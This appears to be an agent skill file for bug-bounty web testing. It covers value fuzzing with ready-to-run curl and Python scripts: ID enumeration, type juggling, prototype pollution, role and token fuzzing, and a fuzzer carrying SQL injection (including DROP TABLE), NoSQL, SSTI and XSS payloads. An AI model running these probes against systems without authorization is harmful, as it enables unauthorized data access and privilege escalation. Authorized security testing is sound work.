---
name: value-fuzzing
description: Value-level fuzzing — ID enumeration, boundary testing, type juggling, format string attacks, injection boundaries, special character injection, integer overflow, Unicode normalization.
---

# Value Fuzzing — ID Enumeration, Boundary Testing, Type Juggling

## 1. Why Value Fuzzing

Most fuzzing focuses on paths and parameters. The highest-value overlooked fuzzing is **what values you send** for known parameters. A single boundary-crossing value (negative number, null, very large integer, type-confused input) can crash parsers, bypass validation, reveal hidden data, or unlock unintended behavior.

**The rule: after discovering a parameter, fuzz 50+ values for it before concluding it's not vulnerable.**

## 2. ID Enumeration Fuzzing

### 2.1 Sequential ID Enumeration

```bash
# Basic sequential enumeration
for id in $(seq 1 1000); do
  RESP=$(curl -s "https://TARGET.COM/api/users/$id" \
    -H "Authorization: Bearer $TOKEN")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/users/$id" \
    -H "Authorization: Bearer $TOKEN")
  LEN=$(echo "$RESP" | wc -c)
  echo "$id -> HTTP $STATUS ($LEN bytes)"
done

# Extract all valid IDs
for id in $(seq 1 5000); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/users/$id")
  if [ "$STATUS" != "404" ]; then
    echo "Found: $id -> HTTP $STATUS"
  fi
done

# Faster with concurrent requests
for id in $(seq 1 100); do
  {
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://TARGET.COM/api/users/$id" \
      -H "Authorization: Bearer $TOKEN")
    if [ "$STATUS" != "404" ]; then
      echo "$id -> $STATUS"
    fi
  } &
done
wait
```

### 2.2 UUID Enumeration

```bash
# UUID v1 timestamps are predictable
# Extract timestamp from known UUID
KNOWN_UUID="550e8400-e29b-11d4-a716-446655440000"
# UUID v1 format: time_low - time_mid - time_hi_and_version - clock_seq - node
# Timestamp = time_low + time_mid<<16 + (time_hi_and_version & 0x0fff)<<32

# UUID v4 brute force (unlikely) — look for patterns instead
# Check if UUIDs have predictable components
for uid in $(cat tmp/discovered-uuids.txt | head -20); do
  VARIANT=$(echo "$uid" | grep -oP '^[^-]+')
  echo "$uid - prefix: $VARIANT"
done

# UUID alternative encoding
for uid in $(cat tmp/discovered-uuids.txt | head -20); do
  # Base64 encode the UUID
  B64=$(echo "$uid" | tr -d '-' | xxd -r -p | base64 | tr '+/' '-_' | tr -d '=')
  echo "UUID: $uid"
  echo "Base64: $B64"
  
  # Test base64-encoded variant
  curl -s "https://TARGET.COM/api/users/$B64" \
    -H "Authorization: Bearer $TOKEN" | head -c 100
  echo "---"
done
```

### 2.3 Hashed/Encoded ID Fuzzing

```bash
# Detect encoding type
for id in 1 2 3 100 101; do
  # Get the encoded form
  ENCODED=$(curl -s "https://TARGET.COM/api/users/me" \
    -H "Authorization: Bearer $TOKEN" | \
    grep -oP '"id"\s*:\s*"[^"]+"' | head -1)
  echo "ID $id -> $ENCODED"
done

# Try common encodings of small numbers
for id in 1 2 3 4 5 10 100 1000 9999; do
  for enc in $(echo -n "$id" | base64) \
             $(echo -n "$id" | base64 | tr '=' '') \
             $(python3 -c "import hashlib; print(hashlib.md5(b'$id').hexdigest())") \
             $(python3 -c "import hashlib; print(hashlib.sha1(b'$id').hexdigest())") \
             $(printf '%x' $id); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://TARGET.COM/api/users/$enc" \
      -H "Authorization: Bearer $TOKEN")
    if [ "$STATUS" != "404" ]; then
      echo "[!] Encoded ID $id -> $enc -> HTTP $STATUS"
    fi
  done
done
```

### 2.4 Bijective / Obfuscated ID Fuzzing

```python
#!/usr/bin/env python3
"""
Test for bijective/obfuscated ID encoding patterns.
Common in SaaS where IDs are sequential but obfuscated.
"""
import requests
import string

TARGET = "https://target.com"
TOKEN = "YOUR_TOKEN"

# Hashids is common for obfuscation
# Hashids encode sequential ints into short strings like "jR" -> 1, "kL" -> 2

# Get several IDs from the app to detect the pattern
urls = [
    f"{TARGET}/api/users/me",
    f"{TARGET}/api/users/1",
    f"{TARGET}/api/users/2",
]

ids_found = set()
for url in urls:
    r = requests.get(url, headers={"Authorization": f"Bearer {TOKEN}"})
    data = r.json()
    # Extract IDs from response recursively
    def extract_ids(obj, path=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k in ("id", "uid", "user_id", "account_id", "org_id"):
                    ids_found.add(str(v))
                extract_ids(v, f"{path}.{k}")
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                extract_ids(v, f"{path}[{i}]")
    extract_ids(data)

print(f"Found IDs: {ids_found}")

# If they look like short alphanumeric strings, test for Hashids
# Hashids alphabet: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
# Try to find sequential encoding
for encoded in sorted(ids_found):
    if encoded.isalnum() and len(encoded) < 12:
        # Try decoding as hashids
        try:
            import hashids
            for salt in ["", "salt", "id", "secret", "app_secret",
                         TARGET.split("//")[1].split(".")[0]]:
                h = hashids.Hashids(salt=salt, min_length=len(encoded))
                decoded = h.decode(encoded)
                if decoded:
                    print(f"[!] Hashids decode: {encoded} -> {decoded} (salt='{salt}')")
        except ImportError:
            pass
```

## 3. Boundary Value Testing

### 3.1 Numeric Boundaries

```bash
# Integer boundaries
for val in 0 1 -1 2147483647 -2147483648 \
            2147483648 -2147483649 \
            9223372036854775807 -9223372036854775808 \
            999999999999999999999999 \
            0.0 0.1 0.5 1.0 1.5 -0.1; do
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/order?quantity=$val" \
    -H "Authorization: Bearer $TOKEN")
  LEN=$(curl -s "https://TARGET.COM/api/order?quantity=$val" \
    -H "Authorization: Bearer $TOKEN" | wc -c)
  echo "quantity=$val -> HTTP $STATUS ($LEN bytes)"
done

# Float precision boundaries
for val in 0.1 0.01 0.001 0.0001 0.00001 1e-10 1e-20 1e100; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/price?amount=$val")
  echo "amount=$val -> HTTP $STATUS"
done
```

### 3.2 String Length Boundaries

```bash
# String length boundaries
for len in 0 1 10 100 255 256 512 1000 1024 2048 4096 65535 65536 100000; do
  VAL=$(python3 -c "print('A'*$len)")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://TARGET.COM/api/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"name\": \"$VAL\"}")
  echo "name($len chars) -> HTTP $STATUS"
done
```

### 3.3 Array Boundary

```bash
# Empty array
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"items": []}'

# Single element
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"items": ["test"]}'

# Many elements
python3 -c "
import requests, json
data = {'items': ['test' + str(i) for i in range(1000)]}
r = requests.post('https://TARGET.COM/api/update', json=data)
print(f'Status: {r.status_code}, Length: {len(r.content)}')
"

# Nested arrays
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"items": [[[[]]]]}'
```

## 4. Type Juggling

### 4.1 JSON Type Confusion

```bash
# Send integer where string expected
curl -s "https://TARGET.COM/api/endpoint?id=1"  # normal
curl -s "https://TARGET.COM/api/endpoint?id=1.0"  # float
curl -s "https://TARGET.COM/api/endpoint?id=true"  # boolean
curl -s "https://TARGET.COM/api/endpoint?id=null"  # null
curl -s "https://TARGET.COM/api/endpoint?id[]=1"  # array

# Send string where number expected
curl -s -X POST "https://TARGET.COM/api/order" \
  -H "Content-Type: application/json" \
  -d '{"quantity": "one"}'

curl -s -X POST "https://TARGET.COM/api/order" \
  -H "Content-Type: application/json" \
  -d '{"quantity": "0x1f"}'

curl -s -X POST "https://TARGET.COM/api/order" \
  -H "Content-Type: application/json" \
  -d '{"quantity": "1e10"}'

# PHP loose comparison (== vs ===)
# "admin" == 0 is TRUE in PHP (string to int conversion)
curl -s "https://TARGET.COM/api/role_check?role=admin"
curl -s "https://TARGET.COM/api/role_check?role=0"
curl -s "https://TARGET.COM/api/role_check?role=0e123"
```

### 4.2 NodeJS / Python Type Confusion

```bash
# NodeJS: __proto__, constructor, prototype pollution
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true}, "name": "test"}'

curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"admin": true}}, "name": "test"}'

# Python: object attribute access via __dict__
curl -s "https://TARGET.COM/api/user?__dict__=1"
curl -s "https://TARGET.COM/api/user?__class__=1"
curl -s "https://TARGET.COM/api/user?__init__=1"

# Ruby: symbol injection
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{":admin": true}'
```

## 5. Null / Empty Value Testing

```bash
# Null parameter values
curl -s "https://TARGET.COM/api/endpoint?param=null"
curl -s "https://TARGET.COM/api/endpoint?param=NULL"
curl -s "https://TARGET.COM/api/endpoint?param=None"
curl -s "https://TARGET.COM/api/endpoint?param=none"
curl -s "https://TARGET.COM/api/endpoint?param=undefined"
curl -s "https://TARGET.COM/api/endpoint?param="  # Empty

# JSON null
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"role": null}'

# Empty objects/arrays
curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{}'

curl -s -X POST "https://TARGET.COM/api/update" \
  -H "Content-Type: application/json" \
  -d '{"items": []}'

# Omitted parameters (don't send the parameter at all)
curl -s -X POST "https://TARGET.COM/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email": "test@test.com"}'  # No password field
```

## 6. Special Character Injection

### 6.1 Metacharacter Fuzzing

```bash
# Characters that may trigger parsing issues
SPECIAL_CHARS=(
  "'"  # SQL string delimiter
  "\""  # JSON string delimiter
  "\\"  # Escape character
  "\n"  # Newline
  "\r"  # Carriage return
  "\t"  # Tab
  "\0"  # Null byte
  "\x00"  # Null byte (URL encoded)
  "%00"  # URL encoded null
  "%0d%0a"  # CRLF injection
  "`"  # Command substitution
  "$"  # Variable expansion
  "|"  # Pipe
  ";"  # Command separator
  "&"  # Background/AND
  "||"  # OR
  "&&"  # AND
  "<"  # HTML/XML
  ">"  # HTML/XML
  "{"  # Template injection
  "}"  # Template injection
  "{{"  # Jinja2 SSTI
  "}}"  # Jinja2 SSTI
  "#"  # URL fragment
  "?"  # Query string start
  "/"  # Path separator
  ".."  # Path traversal
  "../"  # Path traversal
  "..."  # Path traversal variant
  "....//"  # Path traversal variant
)

for char in "${SPECIAL_CHARS[@]}"; do
  URL_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$char'))")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/search?q=$URL_ENC" \
    -H "Authorization: Bearer $TOKEN")
  LEN=$(curl -s "https://TARGET.COM/api/search?q=$URL_ENC" \
    -H "Authorization: Bearer $TOKEN" | wc -c)
  echo "$char (URL: $URL_ENC) -> HTTP $STATUS ($LEN bytes)"
done
```

### 6.2 Unicode Normalization Bypass

```bash
# WAF/Filter bypass via Unicode
# Characters that normalize to ASCII equivalents
UNICODE_VALUES=(
  # Latin small letter sharp s -> ss
  $'\xC3\x9F'  # ß
  # Latin small letter a with combining ring above -> å
  $'\xC3\xA5'  # å
  # Full-width characters
  $'\xEF\xBC\xA1'  # Ａ (full-width A)
  $'\xEF\xBC\xA2'  # Ｂ (full-width B)
  # Homoglyphs
  $'\xCE\xBF'  # ο (Greek omicron -> looks like o)
  $'\xCF\x85'  # υ (Greek upsilon -> looks like u)
  $'\xD0\xB0'  # а (Cyrillic a -> looks like a)
  $'\xD0\xB5'  # е (Cyrillic e -> looks like e)
  $'\xD0\xBE'  # о (Cyrillic o -> looks like o)
  $'\xE1\x9A\x80'  #   (Ogham space mark)
  # Zero-width characters
  $'\xE2\x80\x8B'  # Zero-width space
  $'\xE2\x80\x8C'  # Zero-width non-joiner
  $'\xE2\x80\x8D'  # Zero-width joiner
  $'\xEF\xBB\xBF'  # BOM
  # Script injection via Unicode
  $'\u202E'  # Right-to-left override
)

for val in "${UNICODE_VALUES[@]}"; do
  # Test in parameter value
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/search?q=$val" \
    -H "Authorization: Bearer $TOKEN")
  
  # Test in path
  STATUS2=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/$val/users" \
    -H "Authorization: Bearer $TOKEN")
  
  echo "Unicode '$val' -> param: HTTP $STATUS, path: HTTP $STATUS2"
done

# Unicode normalization in SSRF
curl -s "https://TARGET.COM/api/fetch?url=http://①②③．④⑤⑥．⑦⑧⑨．⑩⑪⑫/" \
  -H "Authorization: Bearer $TOKEN"
# Unicode IP addresses: ①②③．④⑤⑥．⑦⑧⑨．⑩⑪⑫ -> 123.456.789.1011
```

## 7. Format String Fuzzing

```bash
# %s — read string from stack (crash or info leak)
curl -s "https://TARGET.COM/api/user?name=%s%s%s%s%s%s%s%s%s%s"

# %x — read hex from stack (memory leak)
curl -s "https://TARGET.COM/api/user?name=%x.%x.%x.%x.%x.%x.%x.%x"

# %n — write to memory (crash or RCE)
curl -s "https://TARGET.COM/api/user?name=%n%n%n%n%n%n%n%n"

# %p — pointer leak
curl -s "https://TARGET.COM/api/user?name=%p.%p.%p.%p.%p.%p.%p.%p"

# Combined
curl -s "https://TARGET.COM/api/user?name=%s%x%n%p"
```

## 8. Integer Overflow / Underflow

```bash
# Signed 32-bit integer boundaries
INT32_MIN=-2147483648
INT32_MAX=2147483647

# Overflow
curl -s "https://TARGET.COM/api/order?quantity=$((INT32_MAX + 1))"
curl -s "https://TARGET.COM/api/order?quantity=$((INT32_MAX + 1000))"
curl -s "https://TARGET.COM/api/order?quantity=4294967296"  # 2^32

# Underflow
curl -s "https://TARGET.COM/api/order?quantity=$((INT32_MIN - 1))"
curl -s "https://TARGET.COM/api/order?quantity=-999999999999"
curl -s "https://TARGET.COM/api/order?quantity=-4294967296"

# Float underflow
curl -s "https://TARGET.COM/api/price?amount=0.00000000000000000001"
curl -s "https://TARGET.COM/api/price?amount=1e-100"
curl -s "https://TARGET.COM/api/price?amount=-1e-100"

# Mathematical edge cases
curl -s -X POST "https://TARGET.COM/api/calculate" \
  -H "Content-Type: application/json" \
  -d '{"a": 0, "b": 0, "operation": "divide"}'

curl -s -X POST "https://TARGET.COM/api/calculate" \
  -H "Content-Type: application/json" \
  -d '{"a": 1, "b": 0, "operation": "divide"}'

curl -s -X POST "https://TARGET.COM/api/calculate" \
  -H "Content-Type: application/json" \
  -d '{"a": "Infinity", "b": 1}'

curl -s -X POST "https://TARGET.COM/api/calculate" \
  -H "Content-Type: application/json" \
  -d '{"a": "NaN", "b": 1}'
```

## 9. Authentication Value Fuzzing

### 9.1 Token Values

```bash
# For JWT tokens — test extreme edge cases
# Empty token
curl -s "https://TARGET.COM/api/admin/users" \
  -H "Authorization: Bearer "

# Very long token
LONG_TOKEN=$(python3 -c "print('A'*10000)")
curl -s "https://TARGET.COM/api/admin/users" \
  -H "Authorization: Bearer $LONG_TOKEN"

# Special tokens
for token in null undefined None "Bearer null" "Bearer undefined" \
             true false 0 1 admin root system anonymous guest; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/api/admin/users" \
    -H "Authorization: Bearer $token")
  echo "Token '$token' -> HTTP $STATUS"
done
```

### 9.2 Role Values

```bash
# Fuzz role field values
for role in admin superadmin root administrator sysadmin owner \
            moderator editor author contributor subscriber \
            premium enterprise gold silver bronze partner \
            internal staff member user guest anonymous; do
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X PUT "https://TARGET.COM/api/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"role\": \"$role\"}")
  
  echo "role=$role -> HTTP $STATUS"
done
```

## 10. Automated Value Fuzzing Script

```python
#!/usr/bin/env python3
"""
Comprehensive value fuzzer for a single parameter.
Tests boundaries, type confusion, special chars, format strings, and edge cases.
"""
import requests
import concurrent.futures
import json
import sys
import urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
TOKEN = "YOUR_TOKEN"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

BASELINE = requests.get(TARGET, headers=HEADERS)
BASELINE_STATUS = BASELINE.status_code
BASELINE_LENGTH = len(BASELINE.content)
BASELINE_BODY = BASELINE.text[:500]

def test_value(param, value, method="GET"):
    """Test a single value for a parameter"""
    try:
        if method == "GET":
            encoded = urllib.parse.quote(str(value), safe='')
            url = f"{TARGET}?{param}={encoded}" if "?" not in TARGET else f"{TARGET}&{param}={encoded}"
            r = requests.get(url, headers=HEADERS, timeout=10)
        elif method == "POST":
            r = requests.post(TARGET, json={param: value}, headers=HEADERS, timeout=10)
        
        status_diff = r.status_code != BASELINE_STATUS
        length_diff = abs(len(r.content) - BASELINE_LENGTH) > 50
        content_diff = r.text[:500] != BASELINE_BODY
        
        has_error = any(w in r.text.lower() for w in [
            "error", "exception", "stack", "trace", "fatal", "warning",
            "syntax", "unexpected", "invalid", "overflow", "underflow"
        ])
        
        if status_diff or length_diff or has_error:
            return {
                "value": str(value)[:100],
                "status": r.status_code,
                "length": len(r.content),
                "status_diff": status_diff,
                "length_diff": length_diff,
                "has_error": has_error,
            }
    except:
        return None

def generate_values():
    """Generate comprehensive test values"""
    values = []
    
    # Null / special
    values.extend([None, "", "null", "NULL", "None", "undefined", "nil"])
    
    # Boolean / numeric
    values.extend([True, False, 0, 1, -1])
    
    # String type confusion
    values.extend(["true", "false", "0", "1", "-1", "null", "undefined"])
    
    # Integer boundaries
    values.extend([0, 1, -1, 2147483647, -2147483648, 2147483648, -2147483649,
                   9223372036854775807, -9223372036854775808, 10**100, -10**100])
    
    # Float edges
    values.extend([0.0, 0.1, -0.1, 1.0, -1.0, 1e10, 1e-10, 1e100, -1e100])
    
    # Special chars
    for c in ["'", '"', "\\", "\n", "\r", "\t", "\x00", "%00", "%0d%0a",
              "`", "$", "|", ";", "&", "<", ">", "{", "}", "#", "?", "/",
              "..", "../", "....//"]:
        values.append(c)
    
    # Format strings
    for fs in ["%s", "%x", "%n", "%p", "%d", "%f",
               "%s%s%s%s%s%s%s%s",
               "%x.%x.%x.%x.%x.%x.%x.%x",
               "%n%n%n%n"]:
        values.append(fs)
    
    # SQL injection
    values.extend(["' OR '1'='1", "'; DROP TABLE users; --",
                   "' UNION SELECT * FROM users--",
                   "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2"])
    
    # NoSQL injection
    values.extend(['{"$gt": ""}', '{"$ne": ""}', '{"$where": "1==1"}',
                   '[$regex=".*"]', '{"$exists": true}'])
    
    # SSTI
    values.extend(["{{7*7}}", "${{7*7}}", "#{7*7}", "${7*7}",
                   "<%= 7*7 %>", "{{config}}", "{{self}}"])
    
    # XSS
    values.extend(["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                   "javascript:alert(1)", "\"><script>alert(1)</script>"])
    
    # Long strings
    values.append("A" * 10)
    values.append("A" * 100)
    values.append("A" * 1000)
    values.append("A" * 10000)
    
    # Array / object injection
    values.append("[]")
    values.append("{}")
    values.append("[1,2,3]")
    
    return values

def run():
    param = sys.argv[2] if len(sys.argv) > 2 else "id"
    values = generate_values()
    
    print(f"Value Fuzzing: {TARGET}?{param}=<value>")
    print(f"Baseline: HTTP {BASELINE_STATUS} ({BASELINE_LENGTH}B)")
    print(f"Testing {len(values)} values\n")
    
    findings = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        fut = {executor.submit(test_value, param, v): v for v in values}
        for f in concurrent.futures.as_completed(fut):
            result = f.result()
            if result:
                findings.append(result)
                tags = []
                if result["has_error"]: tags.append("ERROR")
                if result["status_diff"]: tags.append(f"STATUS {result['status']}")
                if result["length_diff"]: tags.append(f"LENGTH {result['length']}B")
                print(f"  [{', '.join(tags)}] {result['value']}")
    
    print(f"\nFound {len(findings)} interesting values")
    with open("value_fuzz_findings.json", "w") as f:
        json.dump(findings, f, indent=2)
    print("Saved to value_fuzz_findings.json")

if __name__ == "__main__":
    run()
```

## 11. Content-Type Value Fuzzing

```bash
# Same parameter, different content types — often parsed differently
curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"id": 1}'

curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<id>1</id>'

curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'id=1'

curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: multipart/form-data" \
  -F "id=1"

curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: text/plain" \
  -d 'id=1'

curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: application/yaml" \
  -d 'id: 1'

# Content-Type charset variations
curl -s -X POST "https://TARGET.COM/api/endpoint" \
  -H "Content-Type: application/json; charset=utf-16" \
  -d '{"id": 1}'
```

## 12. HTTP Header Value Fuzzing

```bash
# Host header injection variants
for host in "localhost" "127.0.0.1" "internal" "admin.local" \
            "evil.com" "null" "0.0.0.0" "0" "[::]"; do
  RESP=$(curl -s "https://TARGET.COM/admin" \
    -H "Host: $host" \
    -v 2>&1)
  echo "Host: $host -> $(echo "$RESP" | grep -i "^< HTTP" | head -1)"
done

# X-Forwarded-For bypass values
for ip in "127.0.0.1" "10.0.0.1" "172.16.0.1" "192.168.1.1" \
          "localhost" "::1" "0.0.0.0" "2130706433"  # 127.0.0.1 as int
do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET.COM/admin" \
    -H "X-Forwarded-For: $ip")
  echo "X-Forwarded-For: $ip -> HTTP $STATUS"
done
```

## 13. Response-Based Value Fuzzing

```bash
# Some APIs reveal valid values in error or pagination responses
# Extract valid IDs from paginated responses
for page in $(seq 1 10); do
  curl -s "https://TARGET.COM/api/users?page=$page&limit=100" \
    -H "Authorization: Bearer $TOKEN" | \
    jq -r '.data[]?.id // .items[]?.id // .users[]?.id // empty' >> tmp/all-ids.txt
done

sort -u tmp/all-ids.txt

# Extract UUIDs/IDs from HTML
curl -s "https://TARGET.COM/dashboard" \
  -H "Cookie: session=$SESSION" | \
  grep -oP 'data-id=["'"'"']?\K[a-zA-Z0-9-]+|/[a-zA-Z0-9-]{36}\b|user_\K\d+' | \
  sort -u > tmp/html-ids.txt

# Check if IDs from different categories overlap or follow patterns
# User IDs: 1, 2, 3...  Order IDs: 10001, 10002...  Transaction IDs: T100, T101...
```

## 14. Real-World Value Fuzzing Discoveries

| Value Fuzzed | Found On | Result | Bounty |
|-------------|----------|--------|--------|
| `role=0` | PHP app with loose comparison | "admin" == 0 is TRUE | $3,000 |
| `id=-1` | GraphQL | Returned admin user data | $10,000+ |
| `amount=-100` | E-commerce | Negative charge (money added to account) | $5,000+ |
| `quantity="1e10"` | Payment API | Integer overflow → $0.01 charged | $7,500 |
| `role=null` | Node.js API | Role set to null → no permission check | $2,000 |
| `offset=-1` | PostgreSQL backend | SQL LIMIT clause injection | $4,000+ |
| `limit=2147483648` | MySQL backend | Integer overflow in LIMIT | $3,000+ |
| `name=%s%s%s%s%s` | C-based API | Format string → memory leak | $2,000+ |
| `__proto__[admin]=true` | Node.js API | Prototype pollution → privilege escalation | $5,000+ |
| `id[]=1&id[]=2&id[]=3` | PHP API | Array injection → IDOR bypass | $1,500+ |
| `{\"$gt\":\"\"}` | MongoDB API | NoSQL injection → auth bypass | $3,000+ |
| `template={{7*7}}` | Python/Jinja2 | SSTI → RCE | $10,000+ |

## 15. Checklist

- [ ] Fuzz sequential IDs (integer, base64, hash, UUID)
- [ ] Fuzz negative numbers for credit/balance operations
- [ ] Fuzz very large numbers (overflow)
- [ ] Fuzz null and empty values
- [ ] Fuzz type confusion (string vs int vs bool vs null)
- [ ] Fuzz special characters (SQL, NoSQL, SSTI, XSS, command injection)
- [ ] Fuzz format strings (%s, %x, %n, %p)
- [ ] Fuzz Unicode normalization bypass characters
- [ ] Fuzz all HTTP methods on discovered endpoints
- [ ] Fuzz content types (JSON, XML, form, multipart, YAML, text)
- [ ] Fuzz header values (Host, X-Forwarded-For, Content-Type, Accept)
- [ ] Fuzz array/object boundary values (empty, nested, huge)
- [ ] Fuzz boolean/role/status values (true/false → admin/user)
- [ ] Fuzz prototype pollution (__proto__, constructor)
- [ ] Fuzz PHP loose comparison (0 == "admin")
- [ ] Queue all interesting value findings to Burp for further testing
